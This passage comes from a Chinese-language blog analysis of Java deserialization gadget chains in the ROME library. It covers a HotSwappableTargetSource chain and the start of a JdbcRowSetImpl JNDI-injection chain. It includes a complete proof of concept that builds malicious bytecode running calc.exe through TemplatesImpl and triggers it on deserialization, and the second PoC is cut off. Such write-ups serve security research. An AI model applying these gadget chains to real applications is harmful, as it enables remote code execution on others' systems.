data-src='https://cdn.nlark.com/yuque/0/2024/png/36078896/1711869129950-cca4779b-cef0-4b60-8675-9008b9039487.png#averageHue=%232d3034&clientId=u949e3f87-10b5-4&from=paste&height=164&id=u3014f94e&originHeight=307&originWidth=1338&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=148132&status=done&style=none&taskId=u895e21fa-3996-4915-b646-68e9584c64f&title=&width=713.6'><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1711869129950-cca4779b-cef0-4b60-8675-9008b9039487.png#averageHue=%232d3034&clientId=u949e3f87-10b5-4&from=paste&height=164&id=u3014f94e&originHeight=307&originWidth=1338&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=148132&status=done&style=none&taskId=u895e21fa-3996-4915-b646-68e9584c64f&title=&width=713.6" referrerpolicy="no-referrer" alt="image.png"><br>后续的调用涉及到<code>XString</code>这个类，他是关于 Xpath 相关操作的类，具体就不看了<br class='item-img' data-src='https://cdn.nlark.com/yuque/0/2024/png/36078896/1711869290522-bad8fd20-899d-4ae9-b52c-e919c8dcbdda.png#averageHue=%232b2d31&clientId=u949e3f87-10b5-4&from=paste&height=187&id=u0ba7c5c4&originHeight=350&originWidth=1117&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=136388&status=done&style=none&taskId=u3f519660-228b-4839-b9ea-1d56c953eeb&title=&width=595.7333333333333'><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1711869290522-bad8fd20-899d-4ae9-b52c-e919c8dcbdda.png#averageHue=%232b2d31&clientId=u949e3f87-10b5-4&from=paste&height=187&id=u0ba7c5c4&originHeight=350&originWidth=1117&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=136388&status=done&style=none&taskId=u3f519660-228b-4839-b9ea-1d56c953eeb&title=&width=595.7333333333333" referrerpolicy="no-referrer" alt="image.png"><br>直接看它的 equals 方法，最终调用到了 obj2 的 toString 方法，这里 obj2 的赋值有点讲究，我们回顾之前 equals 方法的内容，quals 方法的参数是 that.target，并且这个 that 的类型是HotSwappableTargetSource 本身，所以我们这里需要两次实例化不同的HotSwappableTargetSource，第一次实例化构造 target 为 Xstring，第二次实例化新的HotSwappableTargetSource，target 构造为 toStringBean，这样才能保证 obj2 被赋值为 toStringBean<br class='item-img' data-src='https://cdn.nlark.com/yuque/0/2024/png/36078896/1711871375821-e46c3d30-a76d-4233-aa67-82a8d2bbe1f4.png#averageHue=%232e3135&clientId=u949e3f87-10b5-4&from=paste&height=93&id=u809c6f7c&originHeight=175&originWidth=1259&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=88575&status=done&style=none&taskId=u5a9b1d4b-ca79-4e51-8d3a-045f55a4f7d&title=&width=671.4666666666667'><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1711871375821-e46c3d30-a76d-4233-aa67-82a8d2bbe1f4.png#averageHue=%232e3135&clientId=u949e3f87-10b5-4&from=paste&height=93&id=u809c6f7c&originHeight=175&originWidth=1259&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=88575&status=done&style=none&taskId=u5a9b1d4b-ca79-4e51-8d3a-045f55a4f7d&title=&width=671.4666666666667" referrerpolicy="no-referrer" alt="image.png"><br class='item-img' data-src='https://cdn.nlark.com/yuque/0/2024/png/36078896/1711869355912-e8a51e55-79ae-4799-ac5f-a67315f54e7a.png#averageHue=%232c2e33&clientId=u949e3f87-10b5-4&from=paste&height=443&id=u2594ffa7&originHeight=830&originWidth=1082&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=309669&status=done&style=none&taskId=u1671b95a-c4b8-4dca-9e4b-f89ae39a6dc&title=&width=577.0666666666667'><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1711869355912-e8a51e55-79ae-4799-ac5f-a67315f54e7a.png#averageHue=%232c2e33&clientId=u949e3f87-10b5-4&from=paste&height=443&id=u2594ffa7&originHeight=830&originWidth=1082&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=309669&status=done&style=none&taskId=u1671b95a-c4b8-4dca-9e4b-f89ae39a6dc&title=&width=577.0666666666667" referrerpolicy="no-referrer" alt="image.png"><br>接着后续就是直接调用 toStringBean 的 toString 方法就行</p>
<h3 id="1x02-流程利用分析"><a href="#1x02-流程利用分析" class="headerlink" title="1x02 流程利用分析"></a>1x02 流程利用分析</h3><p>后半段的流程已经分析完毕，现在集中解决上半段触发的问题，此时我脑海中有两种思路，一种是通过 hashmap 的 readObject 作为入口，后续触发putVal 那一条，还有一种思路是通过 HashTable 的 readObject 去触发。两者我都去尝试一下了，hashmap 是肯定是可以的，但是 hashtable 要想触发 euals 方法就必须经过 hash 碰撞，这里不是说我们不能满足 hash 碰撞，而是我们现在的目标类<strong>HotSwappableTargetSource，</strong>他本身就不是 map 类型，导致我们无法”yy”,”zZ”字符串去绕过 hash 碰撞问题，所以暂时只分析 hashmap<br>hashMap 的 readObject 入口，当调用到 putval 方法时，也会在其中调用到 equals 方法<br class='item-img' data-src='https://cdn.nlark.com/yuque/0/2024/png/36078896/1711869918315-3926bfe2-a06a-4ef7-afa7-53902eb266e9.png#averageHue=%232c2f33&clientId=u949e3f87-10b5-4&from=paste&height=582&id=u21189db8&originHeight=1091&originWidth=1529&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=533274&status=done&style=none&taskId=uc29b43d7-77ac-416d-b41e-9f850080667&title=&width=815.4666666666667'><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1711869918315-3926bfe2-a06a-4ef7-afa7-53902eb266e9.png#averageHue=%232c2f33&clientId=u949e3f87-10b5-4&from=paste&height=582&id=u21189db8&originHeight=1091&originWidth=1529&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=533274&status=done&style=none&taskId=uc29b43d7-77ac-416d-b41e-9f850080667&title=&width=815.4666666666667" referrerpolicy="no-referrer" alt="image.png"></p>
<h4 id="2x01-hashMap-入口"><a href="#2x01-hashMap-入口" class="headerlink" title="2x01 hashMap 入口"></a>2x01 hashMap 入口</h4><p>调用栈如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">HashMap.readObject<br>HashMap.putVal<br>HotSwappableTargetSource.equals<br>XString.equals<br>ToStringBean.toString<br></code></pre></td></tr></table></figure>
<p>POC 如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><span class="hljs-keyword">import</span> org.springframework.aop.target.HotSwappableTargetSource;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HotSwappableTargetSourcePOC</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span><span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-comment">//利用javassist写恶意字节码</span><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;i&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);<br>        ctClass.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> ctClass.makeClassInitializer();<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;</span>);<br>        <span class="hljs-type">byte</span>[] bytes = ctClass.toBytecode();<br><br>        <span class="hljs-comment">//反射对TemplateImpl复制，常规的bytecodes(恶意字节码)  _name _tfactory不为空的限制</span><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templatesImpl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(templatesImpl, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;bytes&#125;);<br>        setFieldValue(templatesImpl, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>);<br>        setFieldValue(templatesImpl, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-literal">null</span>);<br><br>        <span class="hljs-type">ToStringBean</span> <span class="hljs-variable">toStringBean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ToStringBean</span>(Templates.class, templatesImpl);<br>        <span class="hljs-type">HotSwappableTargetSource</span> <span class="hljs-variable">h2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HotSwappableTargetSource</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">XString</span>(<span class="hljs-string">&quot;x&quot;</span>));<br>        <span class="hljs-type">HotSwappableTargetSource</span> <span class="hljs-variable">h1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HotSwappableTargetSource</span>(toStringBean);<br><br><br>        HashMap&lt;Object,Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap.put(h1,h1);<br>        hashMap.put(h2,h2);<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bs</span> <span class="hljs-operator">=</span> unSerial(hashMap);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> ByteArrayOutputStream <span class="hljs-title function_">unSerial</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bs</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(bs);<br>        out.writeObject(o);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bs.toByteArray()));<br>        in.readObject();<br>        in.close();<br>        <span class="hljs-keyword">return</span> bs;<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Base64Encode</span><span class="hljs-params">(ByteArrayOutputStream bs)</span>&#123;<br>        <span class="hljs-type">byte</span>[] encode = Base64.getEncoder().encode(bs.toByteArray());<br>        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(encode);<br>        System.out.println(s);<br>        System.out.println(s.length());<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String field, Object arg)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(field);<br>        f.setAccessible(<span class="hljs-literal">true</span>);<br>        f.set(obj, arg);<br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure>

<h5 id="3x01-流程分析"><a href="#3x01-流程分析" class="headerlink" title="3x01 流程分析"></a>3x01 流程分析</h5><p>入口点打在 readObject，然后跟进到 hashmap 的 readobject 方法<br>然后持续跟进到 for 循环处，注意这里的第一次 key 的传值，是 slot_9，也就是我们 POC 中第一次put 的HotSwappableTargetSource<br class='item-img' data-src='https://cdn.nlark.com/yuque/0/2024/png/36078896/1711873396374-6bc15805-d842-4a5b-b0b9-71c7d44f26c3.png#averageHue=%23343940&clientId=u949e3f87-10b5-4&from=paste&height=554&id=u603227d7&originHeight=1039&originWidth=1937&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=801789&status=done&style=none&taskId=u3bff8252-21c3-4044-a4ae-745a88bebf1&title=&width=1033.0666666666666'><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1711873396374-6bc15805-d842-4a5b-b0b9-71c7d44f26c3.png#averageHue=%23343940&clientId=u949e3f87-10b5-4&from=paste&height=554&id=u603227d7&originHeight=1039&originWidth=1937&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=801789&status=done&style=none&taskId=u3bff8252-21c3-4044-a4ae-745a88bebf1&title=&width=1033.0666666666666" referrerpolicy="no-referrer" alt="image.png"><br>然后跟进 putval，来到第二次 if 判断，这里要使 p 不等 null，才能走进 else 内容，触发 equals 方法<br class='item-img' data-src='https://cdn.nlark.com/yuque/0/2024/png/36078896/1711873613399-a02582fd-e2ee-4630-b7f2-60a799cbcb69.png#averageHue=%2333383e&clientId=u949e3f87-10b5-4&from=paste&height=628&id=ue7ad942e&originHeight=1177&originWidth=1824&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=832850&status=done&style=none&taskId=ua1790ed1-fe26-4a0a-bf99-75994e624e1&title=&width=972.8'><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1711873613399-a02582fd-e2ee-4630-b7f2-60a799cbcb69.png#averageHue=%2333383e&clientId=u949e3f87-10b5-4&from=paste&height=628&id=ue7ad942e&originHeight=1177&originWidth=1824&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=832850&status=done&style=none&taskId=ua1790ed1-fe26-4a0a-bf99-75994e624e1&title=&width=972.8" referrerpolicy="no-referrer" alt="image.png"><br>但是当前 tab，也就是当前这个 hashmap 所有内容为空，所以不论我们现在 i 算出来多少作为键，tab 中取出的一定是 null，所以第一次进 putval 是无法触发后续链子的，这也是为什么我们 POC 要两次实例化不同的 HotSwappableTargetSource，后续就没有意义了，就是走进 if 判断成功的内容，然后将我们第一个HotSwappableTargetSource（带有XString 实体） 压入临时 tab<br>那么继续第二次 putval 的跟进，此时 i 算出来的键值可以正好在临时 tab 缓存中取到我们刚才压入的 Hot，所以这里 p 取出不为 null，并且由于两次 putval 我们的作用对象都是 HotSwappableTargetSource 类型，两者的 hash 算出来一定是一样的，所以 if 前半段条件也会通过，后续 key 值就是我们第一次 putval 带有 toStringBean 的HotSwappableTargetSource 了，然后 k 值就是我们本次 putval 带有 XString 的 HotSwappableTargetSource<br class='item-img' data-src='https://cdn.nlark.com/yuque/0/2024/png/36078896/1711873904181-1dfd10b9-17f7-45c2-a1bd-b0a3ac1a363d.png#averageHue=%2333383f&clientId=u949e3f87-10b5-4&from=paste&height=643&id=ub6f19978&originHeight=1205&originWidth=1922&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=964608&status=done&style=none&taskId=u468e8c86-750e-4514-b423-8813c45b421&title=&width=1025.0666666666666'><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1711873904181-1dfd10b9-17f7-45c2-a1bd-b0a3ac1a363d.png#averageHue=%2333383f&clientId=u949e3f87-10b5-4&from=paste&height=643&id=ub6f19978&originHeight=1205&originWidth=1922&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=964608&status=done&style=none&taskId=u468e8c86-750e-4514-b423-8813c45b421&title=&width=1025.0666666666666" referrerpolicy="no-referrer" alt="image.png"><br>所以这里就可以跟进 equals 方法了<br>(分析到这里时我换了 spring5 版本的依赖，原因是 spring6 肯定不与 jdk8 兼容，升高 jdk 会导致一些类找不到，所以这里权衡之下选择降低 spring 的版本为 5，equals 方法有所区别了，但思路依旧)<br class='item-img' data-src='https://cdn.nlark.com/yuque/0/2024/png/36078896/1711874343304-f3ad6bed-25b4-4a51-a331-13700fa5248f.png#averageHue=%232e3643&clientId=uac6423a2-4ddb-4&from=paste&height=158&id=uce645cb6&originHeight=297&originWidth=2204&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=215406&status=done&style=none&taskId=ufcce3085-826c-44bf-9bf2-bce9090eb81&title=&width=1175.4666666666667'><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1711874343304-f3ad6bed-25b4-4a51-a331-13700fa5248f.png#averageHue=%232e3643&clientId=uac6423a2-4ddb-4&from=paste&height=158&id=uce645cb6&originHeight=297&originWidth=2204&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=215406&status=done&style=none&taskId=ufcce3085-826c-44bf-9bf2-bce9090eb81&title=&width=1175.4666666666667" referrerpolicy="no-referrer" alt="image.png"><br>那么这里就开始调用 Xstring 的 equals 方法了，obj2 被构造为了 toStringBean<br class='item-img' data-src='https://cdn.nlark.com/yuque/0/2024/png/36078896/1711874676767-4b3f97cc-fd96-45ae-b91c-a671f22986fa.png#averageHue=%232b3037&clientId=uac6423a2-4ddb-4&from=paste&height=373&id=u996bd242&originHeight=700&originWidth=1456&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=278454&status=done&style=none&taskId=u5cf4acb5-d220-4ff8-a529-ec26d6ab3b3&title=&width=776.5333333333333'><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1711874676767-4b3f97cc-fd96-45ae-b91c-a671f22986fa.png#averageHue=%232b3037&clientId=uac6423a2-4ddb-4&from=paste&height=373&id=u996bd242&originHeight=700&originWidth=1456&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=278454&status=done&style=none&taskId=u5cf4acb5-d220-4ff8-a529-ec26d6ab3b3&title=&width=776.5333333333333" referrerpolicy="no-referrer" alt="image.png"><br>后续就是 toStringBean 熟悉的流程了，不跟进了</p>
<h2 id="0x05-JdbcRowSetImpl利用链"><a href="#0x05-JdbcRowSetImpl利用链" class="headerlink" title="0x05 JdbcRowSetImpl利用链"></a>0x05 JdbcRowSetImpl利用链</h2><p>相信之前 fastjson 利用的时候应该很熟悉了，只不过利用点完全不同，fastjson 是利用的 set 方法，RMOE 中只会调用 get 方法，所以这里是调用其 get 方法触发的<br>这个 get 方法是getDatabaseMetaData，他调用了 connect 方法了<br class='item-img' data-src='https://cdn.nlark.com/yuque/0/2024/png/36078896/1711876721948-a2ad57f7-d875-4643-970d-f9a58d8327f9.png#averageHue=%232e3138&clientId=u4731c904-8da4-4&from=paste&height=142&id=u5d4a42ed&originHeight=266&originWidth=1419&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=124349&status=done&style=none&taskId=u869ff25d-5869-4e83-867d-e9c23d7726e&title=&width=756.8'><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1711876721948-a2ad57f7-d875-4643-970d-f9a58d8327f9.png#averageHue=%232e3138&clientId=u4731c904-8da4-4&from=paste&height=142&id=u5d4a42ed&originHeight=266&originWidth=1419&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=124349&status=done&style=none&taskId=u869ff25d-5869-4e83-867d-e9c23d7726e&title=&width=756.8" referrerpolicy="no-referrer" alt="image.png"><br>又是熟悉的调用<code>InitialContext</code>的 lookup 方法引起的 JNDI 注入标记<br class='item-img' data-src='https://cdn.nlark.com/yuque/0/2024/png/36078896/1711876783204-550fe907-c7a6-4716-b254-4fc193a9455c.png#averageHue=%232d3034&clientId=u4731c904-8da4-4&from=paste&height=311&id=u2772e2b1&originHeight=583&originWidth=2215&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=367753&status=done&style=none&taskId=ud83d7be2-e200-48e1-b2bb-b6ca6f159d9&title=&width=1181.3333333333333'><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1711876783204-550fe907-c7a6-4716-b254-4fc193a9455c.png#averageHue=%232d3034&clientId=u4731c904-8da4-4&from=paste&height=311&id=u2772e2b1&originHeight=583&originWidth=2215&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=367753&status=done&style=none&taskId=ud83d7be2-e200-48e1-b2bb-b6ca6f159d9&title=&width=1181.3333333333333" referrerpolicy="no-referrer" alt="image.png"><br>lookup 里面的参数我们保证可控，跟进 getDataSourceName<br>到了父类 BaseRowSet 的 getDataSourceName 方法， 他直接返回 dataSource 属性<br class='item-img' data-src='https://cdn.nlark.com/yuque/0/2024/png/36078896/1711882289729-34eba56f-e416-4c6b-a4e1-5f38a3a052e3.png#averageHue=%232d3035&clientId=u9f9b8bcd-7272-4&from=paste&height=118&id=u714d0827&originHeight=221&originWidth=995&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=79349&status=done&style=none&taskId=u92b70d46-6487-47c7-883a-6237038deb5&title=&width=530.6666666666666'><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1711882289729-34eba56f-e416-4c6b-a4e1-5f38a3a052e3.png#averageHue=%232d3035&clientId=u9f9b8bcd-7272-4&from=paste&height=118&id=u714d0827&originHeight=221&originWidth=995&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=79349&status=done&style=none&taskId=u92b70d46-6487-47c7-883a-6237038deb5&title=&width=530.6666666666666" referrerpolicy="no-referrer" alt="image.png"><br>这里 dataSource 属性的设定依然还是要调用到 JdbcRowImpl 的setDataSourceName 方法，然后调用回 BaseRowSet 的setDataSourceName<br class='item-img' data-src='https://cdn.nlark.com/yuque/0/2024/png/36078896/1711882570302-f8f4de14-e895-4cec-96bc-a36621a8698e.png#averageHue=%232b2e33&clientId=u9f9b8bcd-7272-4&from=paste&height=323&id=u63010627&originHeight=606&originWidth=1439&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=324623&status=done&style=none&taskId=ud9f0da86-a800-490b-a06a-470ae60583d&title=&width=767.4666666666667'><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1711882570302-f8f4de14-e895-4cec-96bc-a36621a8698e.png#averageHue=%232b2e33&clientId=u9f9b8bcd-7272-4&from=paste&height=323&id=u63010627&originHeight=606&originWidth=1439&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=324623&status=done&style=none&taskId=ud9f0da86-a800-490b-a06a-470ae60583d&title=&width=767.4666666666667" referrerpolicy="no-referrer" alt="image.png"><br>那参数可控的限制也解除，现在只需要考虑入口点怎么选了，其实前面的触发点都能够作为我们这里的入口点，JdbcRowImpl 的攻击手段在 ROME 反序列化中属于一个后续利用，也就是说我们可以不用去通过加载恶意类实现 RCE 了</p>
<h3 id="1x01-攻击实现"><a href="#1x01-攻击实现" class="headerlink" title="1x01 攻击实现"></a>1x01 攻击实现</h3><p>先看 hashmap 的入口</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">HashMap&lt;K,V&gt;.readObject(ObjectInputStream)<br>HashMap&lt;K,V&gt;.hash(Object)<br>ObjectBean.hashCode()<br>EqualsBean.hashCode()                  <br>EqualsBean.beanHashCode()<br>ToStringBean.toString()<br>ToStringBean.toString(String)<br>JdbcRowSetImpl.getDataSourceName<br></code></pre></td></tr></table></figure>
<p>选择 hashmap<br>这里 JNDI 注入有很多选择，自己本地起一个 LDAP 或者 RMI 服务，或者用其他工具起也行，我这里用的 Yakit<br class='item-img' data-src='https://cdn.nlark.com/yuque/0/2024/png/36078896/1711886346857-743df9cf-c566-4026-ac4c-c9bf427e4f58.png#averageHue=%23e4d6a8&clientId=u9f9b8bcd-7272-4&from=paste&height=416&id=uf86c78a8&originHeight=1011&originWidth=606&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=50269&status=done&style=none&taskId=ua118d734-2db7-4849-a710-4d4b5e0ef36&title=&width=249.20001220703125'><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1711886346857-743df9cf-c566-4026-ac4c-c9bf427e4f58.png#averageHue=%23e4d6a8&clientId=u9f9b8bcd-7272-4&from=paste&height=416&id=uf86c78a8&originHeight=1011&originWidth=606&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=50269&status=done&style=none&taskId=ua118d734-2db7-4849-a710-4d4b5e0ef36&title=&width=249.20001220703125" referrerpolicy="no-referrer" alt="image.png"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.rowset.JdbcRowSetImpl;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JdbcRowSetImplPOC</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span 